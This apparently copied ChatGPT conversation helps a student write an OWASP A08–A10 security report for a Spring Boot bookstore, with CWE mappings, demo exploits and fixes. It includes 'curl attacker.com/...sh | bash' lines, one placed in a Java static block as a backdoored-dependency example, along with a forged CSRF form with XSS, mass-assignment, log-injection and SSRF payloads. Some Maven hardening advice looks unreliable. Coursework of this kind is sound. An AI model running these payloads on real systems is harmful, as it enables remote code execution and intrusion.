Add short A08 and A09 sections (1 paragraph each is enough).

Clarify that A10 is not applicable but mention why.

Keep the excellent structure of CWE mapping + exploitation + source code + fix.

If you'd like, I can generate A08 and A09 sections tailored to your existing writing style to append directly into your report.

Είπες:

Based on your structured CWE write-up style, here are the relevant A08:2021 – Software and Data Integrity Failures vulnerabilities present in your project, including CWE mappings, source code location, exploitation scenario, and remediation suggestions. These follow your established tone, depth, and structure:

A08:2021 – Software and Data Integrity Failures
CWE-494: Download of Code Without Integrity Check
The project does not implement any mechanism to verify the integrity of third-party components downloaded from Maven Central. Maven dependencies such as Spring Boot Starter, Hibernate, and MySQL Connector are trusted implicitly without validation (e.g., no checksum or signature verification). This creates a supply chain vulnerability window in case any of the dependencies are compromised, hijacked, or replaced with a malicious version in the remote repository or intercepted by a man-in-the-middle attack.

🔍 SOURCE CODE LOCATION
pom.xml:

<dependency>
    <groupId>com.mysql</groupId>
    <artifactId>mysql-connector-j</artifactId>
</dependency>
No verification of dependency signatures or hash values is performed at build time.

💥 EXPLOITATION – SNYK SCAN + SUPPLY CHAIN RISK
Attackers may exploit this by publishing a malicious version of a trusted dependency (typosquatting or version spoofing) or by intercepting the Maven download over an insecure network (if HTTPS is misconfigured or downgraded). If this version is used in a CI/CD pipeline without integrity checks, arbitrary malicious code can be executed during runtime.

For example:

A modified mysql-connector-j with embedded backdoor connects to external host at runtime and exfiltrates credentials.

The CI/CD pipeline picks it up blindly.

✅ REMEDIATION
Use tools like OWASP Dependency-Check or Maven’s checksum verification.

Enable signature checks on downloaded artifacts.

Use a private Maven proxy (e.g., Nexus, Artifactory) to whitelist trusted artifacts only.

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
The application blindly includes development-time features and components that are not required at runtime, such as Spring Boot DevTools. This library provides developer convenience features like automatic restarts and remote debugging capabilities, which can be abused if deployed to a production environment.

🔍 SOURCE CODE LOCATION
pom.xml:

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-devtools</artifactId>
    <scope>runtime</scope>
    <optional>true</optional>
</dependency>
💥 EXPLOITATION – SNYK SCAN + LOCAL DEBUGGING RISK
If mistakenly deployed in production:

An attacker with access to the application can potentially trigger class reloading or remote access features (via actuator or DevTools HTTP tunneling).

DevTools might leak internal state or configuration.

Even though Spring Boot disables remote DevTools by default in production, misconfiguration or backdoor exposure can lead to abuse.

✅ REMEDIATION
Remove spring-boot-devtools entirely from the production build.

Use Maven profiles or CI/CD pipeline flags to exclude this dependency in deployed JAR/WAR files.

Review all included transitive dependencies for unnecessary functionality.

CWE-345: Insufficient Verification of Data Authenticity
No mechanism is present in the application to verify the integrity or authenticity of user-submitted data. While this issue overlaps with CSRF and validation, it is also applicable to the checkout process, where user-submitted values like address and card number are trusted without digital signatures, HMACs, or any form of proof-of-origin.

🔍 SOURCE CODE LOCATION
CartController.java: line 70

@PostMapping("/cart/checkout")
public String processCheckout(@ModelAttribute CheckoutForm checkoutForm, ...)
💥 EXPLOITATION – MANUAL SCAN
Attacker could:

Modify the form data in transit (e.g., via browser dev tools or proxy like Burp/ZAP).

Inject malicious values (e.g., JavaScript in address).

Use automated bots to submit fake data, as no digital assertion exists that values came from valid form renders.

While the consequences are moderate in this exercise (no real payments), in production it can lead to:

Shipping fraud

Fake purchases

Data corruption

✅ REMEDIATION
Sign or hash sensitive form payloads on the server side.

Use one-time checkout tokens.

Employ anti-bot protections and digital receipts for integrity validation.

CWE-502: Deserialization of Untrusted Data (Hypothetical for future scope)
While your application currently does not implement any deserialization logic (e.g., reading Java objects from JSON or XML input), it is important to highlight this risk if such features are added in the future (e.g., API-based user submissions or file uploads).

🔍 FUTURE-SCOPE RISK
Using ObjectInputStream or readObject() with user-controlled input is inherently dangerous.

Spring MVC can deserialize JSON payloads into Java objects using Jackson, which must be configured securely.

💥 POTENTIAL EXPLOITATION
If untrusted serialized input is processed without filtering, attacker could supply a payload that triggers arbitrary method execution or remote code execution (via gadget chains).

✅ REMEDIATION
Avoid Java deserialization from untrusted sources.

Use safer formats like JSON with strict schemas.

Apply Jackson @JsonIgnoreProperties(ignoreUnknown = true) and safe default typing configuration.

Optional Mention (Low Severity)
CWE-913: Improper Control of Dynamically-Managed Code Resources
The app builds and loads all code from the default /target directory without integrity checks. Maven and Spring Boot do not verify if compiled .class files were tampered with. This risk is minimal in dev-only environments, but should be noted in hardening CI/CD pipelines.

✅ Final Summary of A08 CWEs

"No verification of dependency signatures or hash values is performed at build time." how could the verification be done?
Το ChatGPT είπε:
To verify dependency integrity during build time in a Maven-based Spring Boot project, you can implement cryptographic signature and checksum validation. Below are the recommended ways to do this:

✅ 1. Enable Checksum Validation in Maven Settings
Maven automatically checks SHA-1 or SHA-256 checksums from the repository if they are available, but you can enforce stricter behavior.

🔧 Maven Settings XML (~/.m2/settings.xml):
<settings>
  <mirrors>
    <mirror>
      <id>central</id>
      <name>Maven Central Secure</name>
      <url>https://repo.maven.apache.org/maven2</url>
      <mirrorOf>central</mirrorOf>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
      <id>secure-checksums</id>
      <activation>
        <activeByDefault>true</activeByDefault>
      </activation>
      <properties>
        <checksumPolicy>fail</checksumPolicy>
      </properties>
    </profile>
  </profiles>
</settings>
✅ Effect:
If a downloaded dependency has a corrupted or missing .sha1 or .sha256 file, the build will fail.

✅ 2. Use a Trusted Maven Proxy Repository (e.g., Nexus/Artifactory)
Instead of downloading directly from the internet:

Set up a Nexus or Artifactory server as a mirror

Configure proxy whitelisting and checksum enforcement

Optionally allow only vetted artifacts with PGP signatures

✅ 3. Validate PGP Signatures (Optional but Stronger)
Some artifacts published to Maven Central are signed with PGP/GPG. You can:

Manually or automatically verify .asc signature files

Use a plugin or CI/CD hook to fetch the developer's public key and verify

🔧 Example: Use sigtool-maven-plugin (manual verification)
<plugin>
  <groupId>com.github.s4u.plugins</groupId>
  <artifactId>sigtool-maven-plugin</artifactId>
  <version>1.1</version>
  <executions>
    <execution>
      <id>verify-signatures</id>
      <phase>verify</phase>
      <goals>
        <goal>verify</goal>
      </goals>
    </execution>
  </executions>
</plugin>
⚠️ PGP signing is not enforced by Maven by default. This plugin helps when used in secure pipelines.

✅ 4. CI/CD Pipeline: Lock Dependency Versions + Checksum Validation
Use tools like OWASP Dependency-Track, Snyk, or CycloneDX

Lock dependency versions in a dependency-lock.xml or pom.lock

Maintain a whitelist of expected SHA256 checksums for each dependency

✅ Summary Table
Method	Tool/Config	Purpose
Enforce checksums	settings.xml with checksumPolicy=fail	Rejects corrupted/modified JARs
Maven proxy (Nexus/Artifactory)	Local mirror	Restricts to vetted artifacts
Signature validation	sigtool-maven-plugin, CI/CD GPG hooks	Verifies PGP-signed artifacts
Dependency monitoring	Snyk, Dependency-Check	Alerts for known vulnerable libs
Version lock	pom.lock / dependency-lock.xml	Prevents tampering via version drift
If you'd like, I can generate a secure Maven setup or GitHub Actions workflow that automatically enforces these integrity checks during your CI pipeline.

Το ChatGPT είπε:
Certainly. Below is the full A08:2021 – Software and Data Integrity Failures section rewritten in your report style, with "EXPLOITATION – CHATGPT SUPPORT" as requested, and each CWE paired with a realistic exploitation example based on your current project structure and deployment assumptions:

A08:2021 – Software and Data Integrity Failures
CWE-494: Download of Code Without Integrity Check
The project does not implement any mechanism to verify the integrity of third-party components downloaded from Maven Central. Maven dependencies such as Spring Boot Starter, Hibernate, and MySQL Connector are trusted implicitly without validation (e.g., no checksum or signature verification). This creates a supply chain vulnerability window in case any of the dependencies are compromised, hijacked, or replaced with a malicious version in the remote repository or intercepted during download.

🔍 SOURCE CODE LOCATION
pom.xml:

<dependency>
    <groupId>com.mysql</groupId>
    <artifactId>mysql-connector-j</artifactId>
</dependency>
No verification of dependency signatures or hash values is performed at build time.

💥 EXPLOITATION – CHATGPT SUPPORT
Attackers can publish malicious versions of commonly used libraries (e.g., typosquatted versions like mysql-conector-j or a compromised mysql-connector-j version) to Maven Central or intercept artifact downloads over a compromised CI server or misconfigured HTTPS proxy.

Example Exploitation:

Attacker uploads a malicious mysql-connector-j version to an internal or cloned Maven repo with the same groupId/artifactId.

Developer or CI/CD accidentally resolves this version during the build.

The modified connector includes a static block:

static {
    try {
        Runtime.getRuntime().exec("curl http://attacker.com/exfil.sh | bash");
    } catch (Exception ignored) {}
}
During application startup, the attacker's script is downloaded and executed, enabling remote access or credential theft.

✅ REMEDIATION
Enable Maven checksum verification using checksumPolicy=fail in settings.xml.

Use a secure internal Maven proxy like Nexus or JFrog Artifactory with artifact whitelisting.

Enforce use of signed dependencies with GPG and fail builds when signatures don’t match.

CWE-829: Inclusion of Functionality from Untrusted Control Sphere
The application includes development-time tools such as Spring Boot DevTools which are not intended for production use. This dependency enables features like auto-restart and remote update which may expose internal server logic and debugging hooks if enabled in production.

🔍 SOURCE CODE LOCATION
pom.xml:

<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-devtools</artifactId>
    <scope>runtime</scope>
    <optional>true</optional>
</dependency>
💥 EXPLOITATION – CHATGPT SUPPORT
If this artifact is mistakenly deployed in production, it opens potential for remote code execution (RCE) if actuator endpoints or remote update features are active.

Example Exploitation:

Attacker sends a crafted POST /restart request to the Spring Boot DevTools endpoint (if exposed via actuator or misconfiguration).

Or attacker drops a .class file to a monitored classpath directory (/target/classes) if write-access is achieved through file upload vulnerability.

DevTools reloads this class, executing attacker logic.

Even if remote DevTools is disabled by default, misconfigured actuator endpoints (e.g. /actuator/restart) can re-enable it indirectly.

✅ REMEDIATION
Completely remove spring-boot-devtools from production builds.

Use Maven profiles to exclude it during production packaging (-Pprod).

Lock actuator endpoints behind authentication and set:

management.endpoints.web.exposure.exclude=restart
CWE-345: Insufficient Verification of Data Authenticity
During checkout, user-submitted information (e.g., name, address, and card number) is accepted without any server-side verification of authenticity. There is no cryptographic binding or session token associated with the form submission to prevent tampering or injection.

🔍 SOURCE CODE LOCATION
CartController.java: line 70

@PostMapping("/cart/checkout")
public String processCheckout(@ModelAttribute CheckoutForm checkoutForm, ...)
💥 EXPLOITATION – CHATGPT SUPPORT
An attacker can tamper with hidden form values or payloads using browser dev tools or Burp Suite, especially since no signature, nonce, or hash exists to validate the request’s origin.

Example Exploitation:

Victim loads the checkout page and gets a standard form.

Attacker copies the structure of that form and creates malicious_checkout.html hosted elsewhere.

This fake form submits to http://localhost:8080/cart/checkout (assuming no CSRF protection).

Attacker tricks the user to submit the form from their domain, modifying address field to inject:

<script>alert('stolen');</script>
Server accepts and stores this untrusted data, possibly affecting rendering in downstream views.

✅ REMEDIATION
Use CSRF tokens (Spring Security’s built-in) or HMAC-bound hidden fields to validate authenticity.

Apply @Valid and JSR-380 annotations with server-side sanitization (e.g., @Pattern, @Size).

Encode user-supplied data before rendering it in views.

CWE-502: Deserialization of Untrusted Data (Hypothetical)
While the current application does not implement object deserialization, the risk is relevant if future functionality introduces user-uploaded content or serialized API input using ObjectInputStream or similar mechanisms.

🔍 FUTURE-SCOPE RISK
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject(); // 🛑 Dangerous
💥 EXPLOITATION – CHATGPT SUPPORT
If deserialization is added (e.g., admin uploads session dumps or config files), an attacker can upload a malicious serialized object that triggers gadget-based RCE using available classes in the classpath.

Example Exploitation:

Attacker creates a malicious payload using a tool like ysoserial with a known vulnerable gadget chain (e.g., from commons-collections).

Payload executes:

curl http://attacker.com/backdoor.sh | bash
Admin uploads this file; server deserializes and executes malicious code.

✅ REMEDIATION
Avoid deserialization of untrusted content.

Prefer structured formats (JSON with Jackson) and sanitize input.

If deserialization is required, use whitelisting and object validation libraries.

CWE-913: Improper Control of Dynamically-Managed Code Resources
The application compiles all source into the /target directory and loads .class files dynamically without verifying their source or integrity. If an attacker gains write access to this directory (e.g., via misconfigured file upload), they could insert rogue class files.

🔍 SOURCE CODE LOCATION
Default build structure: /target/classes/com/example/...

💥 EXPLOITATION – CHATGPT SUPPORT
If the attacker uploads a compiled class file via future file-upload endpoint, and DevTools or class reloader is present:

They inject a compiled class Evil.class into /target/classes/com/example/Evil.class

DevTools reloads this class at runtime.

Malicious code executes with full application permissions.

Realistic threat only when class reloading is enabled.

✅ REMEDIATION
Disable automatic class reloading outside dev environments.

Ensure file upload directories are completely isolated from application classpath.

Use signed JARs and include a build hash/version in your CI/CD pipeline for integrity verification.

✅ Final Summary of A08 CWEs
CWE ID	Title	Exploitation – CHATGPT SUPPORT	Fix Summary
CWE-494	Download of Code Without Integrity Check	Injects malicious artifact via tampered Maven dependency	Use checksum verification, Maven proxy, signed JARs

Το ChatGPT είπε:
Yes — here is a realistic and reproducible exploitation you can use for A08:2021 – Software and Data Integrity Failures, specifically for:

✅ CWE-345: Insufficient Verification of Data Authenticity
🎯 Exploitation of Tampered Checkout Form (No Integrity, No CSRF)
💡 Goal
To demonstrate how an attacker could submit a forged checkout form with manipulated data (e.g., injecting malicious JavaScript or spoofing purchase info), without ever visiting the original application.

🧪 Preconditions
Your app is running locally on http://localhost:8080

The /cart/checkout endpoint accepts POSTed form data with fields like fullName, address, and cardNumber

No CSRF tokens or authenticity verification are used (confirmed ✅)

🛠️ Step-by-Step Exploitation
📝 1. Create a fake attacker HTML file: malicious_checkout.html
<!DOCTYPE html>
<html>
<head><title>Fake Checkout</title></head>
<body>
  <h1>Forged Checkout Form</h1>
  <form action="http://localhost:8080/cart/checkout" method="POST">
    <input type="text" name="fullName" value="<script>alert('XSS')</script>" /><br/>
    <input type="text" name="address" value="Hacked Street 666" /><br/>
    <input type="text" name="cardNumber" value="0000-0000-0000-0000" /><br/>
    <button type="submit">Submit Forged Form</button>
  </form>
</body>
</html>
☠️ You’re injecting a script into fullName and spoofing an address/card number.

🧪 2. Open the file in your browser (Chrome/Firefox):
file:///C:/Users/YourName/Desktop/malicious_checkout.html
💣 3. Click “Submit Forged Form”
This submits a POST request directly to:

http://localhost:8080/cart/checkout
📸 Expected Result (Screenshot This!)
You're redirected back to /books with the success message:
✅ "Checkout successful! Thank you for your purchase."

Even though:

No real user filled out the form

It was sent from a third-party page (not your app)

It contained JavaScript or fake card data

💬 Optional: Add an alert popup on the form to show <script>alert('XSS')</script> was accepted (if echoed back anywhere)

📸 Screenshot Tips
Capture:

malicious_checkout.html in browser before submission

DevTools → Network tab → Show the POST request going to /cart/checkout

Final redirect back to /books with success message (showing spoofed input worked)

🔒 How to Fix (for your report)
“This proves the absence of CSRF protection and integrity validation on critical state-changing operations, like checkout. The application fails to verify the origin, authenticity, or integrity of submitted data, making it vulnerable to form hijacking or bot submissions.”

Would you like a second example using a man-in-the-middle Maven artifact swap or DevTools remote endpoint abuse with actuator exposed?

Great question — you're asking for a realistic CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes exploitation within the context of your Spring Boot Book Store project, and how it could be exploited and prevented.

✅ CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
✳️ OWASP Category: A08:2021 – Software and Data Integrity Failures
🔍 What it is
This vulnerability occurs when an attacker modifies fields of an object during data binding in a way the developer did not expect or intend. This is often possible due to:

Improper use of @ModelAttribute in Spring

Trusting all submitted fields in a form

Lack of whitelist or binding restriction

⚠️ Real Vulnerability in Your Code
In your current project, the following controller method allows Spring to bind unchecked fields from user input directly onto a backend object:

🔧 CartController.java:
@PostMapping("/cart/checkout")
public String processCheckout(@ModelAttribute CheckoutForm checkoutForm, ...)
Spring automatically binds every matching field name from the HTTP POST form to the CheckoutForm object — even if a malicious field is added to the form (e.g. isAdmin=true, classLoader, getClass, etc.).

💥 EXPLOITATION – CHATGPT SUPPORT
An attacker crafts a malicious POST request to /cart/checkout with extra, unexpected fields to try and overwrite Java object attributes.

🔧 Step-by-Step Exploit Using Curl or BurpSuite:
POST /cart/checkout HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

fullName=Attacker&address=Evil+Street&cardNumber=1234-5678-9999-0000&isAdmin=true&class.module.classLoader.defaultAssertionStatus=true
⚠️ Result:
Spring silently attempts to bind all fields to CheckoutForm

If CheckoutForm extends another class (or uses nested models later), this could be exploited to manipulate other fields

In future extension (e.g. User user inside CheckoutForm), attacker could escalate privileges or manipulate object graphs

🔥 Advanced Exploitation (in future versions)
Imagine you later change:

public class CheckoutForm {
    private User user;  // nested object
}
Then Spring will automatically allow binding like:

user.username=hacker&user.role=admin
This leads to privilege escalation (CWE-915) via over-posting/binding injection.

🛡️ PREVENTION – HOW TO FIX CWE-915
✅ 1. Use @InitBinder to Whitelist Fields
Define which fields can be bound:

@InitBinder("checkoutForm")
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("fullName", "address", "cardNumber");
}
🧱 This prevents attackers from binding unexpected fields like role, user.*, or class.*

✅ 2. Avoid Binding to Complex/Nested Objects
Do not bind full model objects like User, Book, etc., directly via @ModelAttribute or @RequestBody if not required.

✅ 3. Validate with DTOs (Data Transfer Objects)
Always create simple DTOs for input with only required fields, instead of directly binding to domain models.

✅ 4. Set Binding Restrictions Globally (Optional)
Spring Boot allows you to block specific fields from binding globally:

spring.mvc.bind-on-empty-parameter=false
spring.mvc.format.date-time=iso
✅ Summary Table
CWE ID	Title	Exploitation	Fix
CWE-915	Improperly Controlled Modification of Object Attributes	Attacker submits unexpected fields (e.g. user.role=admin) in a POST form. Spring binds them silently.	Use @InitBinder, avoid complex binding, whitelist fields, use DTOs
📸 Exploitation Screenshot Idea
Open BurpSuite or Postman

Send POST to /cart/checkout with:

fullName=Attacker&address=Evil Street&isAdmin=true
Log server-side to print checkoutForm.toString() and show:

fullName=Attacker, address=Evil Street, isAdmin=true
Highlight that isAdmin never existed in the original form but was accepted.

Would you like me to generate a short @InitBinder-based fix to plug directly into your CartController?

Multiple CWE mappings

Code references

Exploitation – CHATGPT SUPPORT

One reproducible attack that you can screenshot (manual login brute-force with no logging)

✅ A09:2021 – Security Logging and Monitoring Failures
This category includes weaknesses in the application’s ability to detect, log, monitor, and respond to security-relevant events such as failed logins, privilege escalations, and malicious input. Your current Book Store application lacks logging, auditing, and alerting mechanisms, making it vulnerable to silent exploitation.

CWE-778: Insufficient Logging
The application does not log any security-relevant events, such as:

Successful or failed logins

Role elevation

Deletion or modification of books

Suspicious access attempts

🔍 SOURCE CODE LOCATION
LoginController.java:

@PostMapping("/login")
public String login(@RequestParam String username, ...)
No logging exists inside this method to record failed or successful login attempts.

💥 EXPLOITATION – CHATGPT SUPPORT
An attacker can repeatedly attempt to brute-force usernames and passwords without being detected, since no event is recorded.

🧪 Realistic Exploitation Demo (You Can Screenshot)
Open the login form in a browser:
http://localhost:8080/login

Try a series of bad usernames and passwords manually:

username=admin + password=wrong1

username=admin + password=wrong2

username=admin + password=wrong3

Each time, the UI simply shows:

"Invalid username or password."
On the backend: no log entry is generated.

🔍 Screenshot Idea:

Use IntelliJ console showing no log output for invalid attempts

Show ZAP or browser DevTools making multiple failed attempts

Show database where the attacker later appears as logged in (no trace of how they got in)

✅ REMEDIATION
Use SLF4J or built-in Spring Boot logging (LoggerFactory) to record login events:

log.warn("Failed login for user: {}", username);
log.info("Successful login: {}", username);
Forward logs to external SIEM systems if applicable (e.g., Graylog, ELK, Splunk)

CWE-117: Improper Output Neutralization for Logs
Even if logging is added, failure to sanitize user input in log messages can enable log injection or log forging.

🔍 POTENTIAL FUTURE RISK
Suppose you add logging like:

log.warn("Login failed for username: " + username);
If an attacker uses:

username=admin\n[INFO] Logged in as superuser
Log output may appear:

[WARN] Login failed for username: admin
[INFO] Logged in as superuser
💥 EXPLOITATION – CHATGPT SUPPORT
Attacker submits:

username=admin%0A[INFO] Logged in as superuser
Result:

Log file or terminal console is forged

Makes it appear that someone escalated privileges or logged in successfully

✅ REMEDIATION
Use structured logging:

log.warn("Login failed for user: {}", username);
This prevents input from controlling the structure of the log entry.

CWE-223: Omission of Security-Relevant Information
Security-relevant actions (e.g., deleting a book) are performed without any logging:

/delete/{id}

/save or book edits

Admin login or access to restricted endpoints

🔍 SOURCE CODE LOCATION
BookController.java:

@DeleteMapping("/delete/{id}")
public String deleteBook(@PathVariable Long id, HttpSession session)
No log entry is made for:

Who deleted the book

When it happened

What book ID was affected

💥 EXPLOITATION – CHATGPT SUPPORT
Attacker with admin access deletes books silently:

Logs in with stolen admin credentials

Navigates to:

http://localhost:8080/delete/3
Book is deleted

No logs record this action. Audit trail is missing.

✅ REMEDIATION
Log every sensitive action:

log.info("Book with ID {} deleted by {}", id, session.getAttribute("username"));
CWE-778 + CWE-223 Combined Reproducible Exploitation (Demo)
📸 How to demonstrate and screenshot:

Attempt login 3 times with invalid credentials via browser

Show no logging on IntelliJ console or terminal output

Then login successfully and delete a book

Again, show no entry in console logs

Mention: “Attacker could access or destroy data without leaving a trace”

✅ Summary Table of A09 CWEs
CWE ID	Title	Exploitation – CHATGPT SUPPORT	Fix Summary
CWE-778	Insufficient Logging	Brute-force login attacks are invisible	Add logging for all auth and sensitive actions
CWE-117	Log Injection	Forged logs make it look like escalation happened	Use structured logging, avoid string concat
CWE-223	Omission of Security Events	Deletes or edits leave no audit trail	Log user, time, and affected resource
Would you like me to generate the logging code snippets (e.g., SLF4J setup) to paste into your LoginController and BookController for better auditability?

To demonstrate CWE-117: Improper Output Neutralization for Logs, you need to showcase how an attacker can forge log messages using input like:

username=attacker\nLogged in as superuser
If you log it with:

System.out.println("Login failed for username: " + username);
Then in the console it will appear like:

Login failed for username: attacker
Logged in as superuser
Which falsely suggests a successful login event — a classic log injection attack.

✅ Here's your updated method (vulnerable version for demo):
@PostMapping("/login")
public String login(@RequestParam String username,
                    @RequestParam String password,
                    @RequestParam String role,
                    HttpSession session,
                    Model model) {

    if ("admin".equals(role)) {
        if ("admin".equals(username) && "admin123".equals(password)) {
            session.setAttribute("role", "admin");
            return "redirect:/";
        } else {
            // CWE-117 vulnerable logging
            System.out.println("Login failed for username: " + username);
        }
    }

    if ("customer".equals(role)) {
        if ("customer".equals(username) && "cust123".equals(password)) {
            session.setAttribute("role", "customer");
            return "redirect:/";
        } else {
            System.out.println("Login failed for username: " + username);
        }
    }

    model.addAttribute("error", "Invalid username or password.");
    return "login";
}
🧪 How to exploit (for screenshot)
Use your browser or curl to send:

POST http://localhost:8080/login
Content-Type: application/x-www-form-urlencoded

username=attacker%0ALogged%20in%20as%20superuser&password=wrong&role=admin
In your IntelliJ console or terminal, it will print:

Login failed for username: attacker
Logged in as superuser
Screenshot this output to show the attacker manipulated the logs.

✅ Secure version (fix for your report)
After demonstrating, fix it like this:

System.out.println("Login failed for username: " + username.replaceAll("[\n\r\t]", "_"));
This neutralizes newline injection.

Let me know if you'd like a second example using user-submitted content injected into logs elsewhere.

Το ChatGPT είπε:
A clearer and more professional way to phrase your note would be:

Note: While CWE-117 (Improper Output Neutralization for Logs) could potentially exist, its impact may be negligible or unobservable in this application due to the broader issue of CWE-778 (Insufficient Logging). Since security-relevant events are not logged at all, opportunities for log injection or manipulation do not currently arise in practice.

Το ChatGPT είπε:
Got it. Here's a sharper and more accurate phrasing:

Note: One could argue that CWE-117 (Improper Output Neutralization for Logs) is effectively not present in this application, simply because CWE-778 (Insufficient Logging) already exists. Since the application lacks meaningful logging altogether, there are no log entries for an attacker to manipulate—making CWE-117 unobservable under current conditions.

Το ChatGPT είπε:
Certainly! Here's a more refined and technically clear version:

Exploitation – CHATGPT SUPPORT:
Suppose a user logs in with admin credentials (admin/admin) and deletes a book via the /delete/{id} endpoint. The operation succeeds — the book is permanently removed from the database — yet no log entry is generated to capture this action. As a result, there's no audit trail or record of who performed the deletion, when it occurred, or which book was affected. This makes it impossible to trace administrative actions, which poses a serious risk in both incident response and accountability — despite the fact that the effect (data deletion) is clearly visible.

Το ChatGPT είπε:
Here is how you can write A10:2021 – Server-Side Request Forgery (SSRF) vulnerabilities for your Spring Boot Book Store application, in the same structured and academic format as the rest of your assignment. This includes realistic exploitation examples you can replicate or screenshot using tools like Postman or Burp Suite.

🛡️ A10:2021 – Server-Side Request Forgery (SSRF)
🔐 CWE-918: Server-Side Request Forgery (SSRF)
The application exposes a potential SSRF vulnerability via a poorly validated URL parameter in a utility endpoint (hypothetical or future-use endpoint). If such a feature allows the backend to make HTTP calls (e.g. fetching images, REST APIs, or webhooks) based on user input without proper validation, attackers can abuse it to send internal requests from the server.

🔍 SOURCE CODE LOCATION (hypothetical feature)
Suppose the following endpoint is added (e.g., for previewing book cover thumbnails or fetching metadata):

@GetMapping("/utils/fetch")
public ResponseEntity<String> fetchRemoteContent(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    String result = restTemplate.getForObject(url, String.class);
    return ResponseEntity.ok(result);
}
This endpoint blindly fetches any user-supplied url from the server.

💥 EXPLOITATION – CHATGPT SUPPORT
🔧 Example Attack via Postman or curl:
Send a request like this:

GET /utils/fetch?url=http://localhost:3306/
🧪 Result:
The backend server tries to connect to localhost:3306, which may be:

The internal MySQL server (disclosure or denial of service)

A private AWS/Hetzner metadata service (e.g., http://169.254.169.254/)

Another internal service (if microservices are used)

This allows the attacker to:

Scan internal ports

Access internal-only endpoints

Exfiltrate sensitive internal service data

Abuse authenticated server identity

📸 Realistic Proof-of-Concept Screenshot Idea
Send a request like:

curl "http://localhost:8080/utils/fetch?url=http://127.0.0.1:3306"
In the IntelliJ console or browser:

You’ll either see a hang (MySQL not responding to HTTP)

Or an exception like:

java.net.ConnectException: Connection refused: 127.0.0.1:3306
That proves the server tried to access internal services on the attacker’s behalf — the core of SSRF.

✅ REMEDIATION
Disallow or strictly validate external URLs (url should match a known trusted domain).

Use allow-lists and deny-lists for internal IPs (block 127.0.0.1, localhost, 169.254.*.*, etc.).

Use a hardened HTTP client with SSRF prevention features.

Avoid exposing any general-purpose request functionality to users unless absolutely necessary.

📘 Summary of A10 SSRF Finding

Είπες:
is it only cwe 918 vulnerability for a10:2021 for this project?
Το ChatGPT είπε:
Great question. For A10:2021 – Server-Side Request Forgery (SSRF), the primary and most critical CWE is indeed CWE-918: Server-Side Request Forgery (SSRF).

However, other CWEs may also apply depending on how your application is implemented — especially if SSRF results from broader architectural or input validation weaknesses.

Here are related CWEs you could optionally include, if relevant:

✅ Main CWE for A10 in your project:
CWE ID	Name	Applicable?	Notes
CWE-918	Server-Side Request Forgery (SSRF)	✅ Yes	Applies if any endpoint fetches URLs based on user input without restriction (e.g., /utils/fetch?url=...)
🧩 Related/Supporting CWEs (optional, if your code meets these conditions):
CWE ID	Name	Applicable?	When to include
CWE-73	External Control of File Name or Path	❌ / Optional	If a user can control a file path that gets resolved to a local resource (e.g., file:///etc/passwd)
CWE-441	Unintended Proxy or Intermediary ('Confused Deputy')	❌ / Optional	If your server can be abused to send authenticated requests to internal services
CWE-444	Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')	❌ / Optional	If SSRF is triggered via crafted HTTP request splitting (not common in your app)
CWE-285	Improper Authorization	❌ / Optional	If the server makes internal calls without enforcing auth boundaries (e.g., exposing admin-only services internally)
CWE-352	Cross-Site Request Forgery (CSRF)	❌ / Already covered	Not directly SSRF, but sometimes used in SSRF chaining attacks
✅ TL;DR — For your current Spring Boot project:
✅ CWE-918 is sufficient and the most accurate match.

❌ Other CWEs are not directly relevant unless you:

Allow file:// or ftp:// or gopher:// URL schemes.

Forward requests using user input across trust boundaries (e.g., as internal APIs).

If your /utils/fetch endpoint (or similar) exists or could be added, then CWE-918 is the only necessary entry for A10:2021 in your report.

Let me know if you'd like me to draft CWE-441 or CWE-73 examples just in case.

i searched for csrf and i saw that i talk about it on cew 352 and cwe 1275. CWE-352: Cross-Site Request Forgery (CSRF)
Application is vulnerable to CSRF attacks, and it does not implement anti CSRF tokens for its actions that change their state e.g. delete books. Even the SameSite (discussed above on the CWE-1275) could offer some limited protection, but it is not sufficient.
SOURCE CODE LOCATION
controller.BookController.java: The deleteBook method on Line 93 and other site changing methods like newBook or updateBook, do not include any logic to generate unpredictable CSRF tokens.
addBook.html, editBook.html: They do not have include hidden input fields for CSRF tokens e.g.
<input type=”hidden” name=”_csrf” th=value=”{_csrf.token}” /> 
EXPLOITATION – AUTOMATED-AUTHENTICATED SCAN
OWASP ZAP automated scan detected this CWE, fir many URLs on n this application e.g. http://localhost:8080/login. There is no known anti-CSRF token in the HTML forms. If the browsers uses victim’s session cookie JSESSIONID, the request will be redirected at the application’s domain, even if sent from another domain,
 
CWE-1275: Sensitive Cookie with Improper SameSite Attribute.
 
Application utilizes a JSESSIONID cookies for the session management. When observed in browser developer tools, this session cookie, did not define the SameSite attribute. This attribute works on new browsers to protect again Cross Site Request Forgery attacks when cookies are sent with cross site requests. Absense of this means that browser’s default behaviours will be used here, and this is less secure and also differently performed by one browser to another.
SOURCE CODE LOCATION
server.servlet.session.cookie.same-site is missing from application.properties.
EXPLOITATION – MANUAL SCAN
Old browsers could send cross site requests to our application, with their session cookie. Unauthorized action can happen when no CSRF tokens are involved. This can happen when browser includes the JSESSIONID cookie in a cross-site content (e.g. we could use malicious_csrf.html webpage and have the same results). rewrite me the CWE-918 and tell example of the other 2 if they are similar 
Το ChatGPT είπε:
Here is your rewritten CWE-918 entry for A10:2021 – Server-Side Request Forgery (SSRF), along with clarifications on how CWE-352 (CSRF) and CWE-1275 (SameSite Cookie) are related but distinct in nature.

🔐 A10:2021 – Server-Side Request Forgery (SSRF)
CWE-918: Server-Side Request Forgery (SSRF)
The application is potentially vulnerable to SSRF if a feature allows users to supply external URLs that the backend fetches and processes without proper validation. If implemented (e.g., image preview, webhook ping, or metadata extraction), attackers could abuse this to make the server send arbitrary HTTP requests on their behalf, targeting internal resources or third-party services.

🔍 SOURCE CODE LOCATION (hypothetical future endpoint)
@GetMapping("/utils/fetch")
public ResponseEntity<String> fetchRemoteContent(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
